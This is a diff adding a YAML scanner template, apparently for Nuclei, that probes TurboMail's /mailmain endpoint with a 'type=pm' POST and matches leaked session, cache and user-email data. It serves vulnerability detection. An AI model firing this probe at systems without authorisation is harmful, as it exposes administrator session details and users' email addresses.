@@ -1,0 +1,28 @@
+id: poc-yaml-turbomail-mailmain-info-leak
+info:
+  name: TurboMail Mailmain Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/mailmain"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "type=pm"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SessinonAdmin ht_sessions"
+          - "CachePool"
+          - "MailIndexCache"
+      - type: regex
+        part: body
+        regex:
+          - "user:([A-Za-z.]+@[A-Za-z.]+\\.com)"
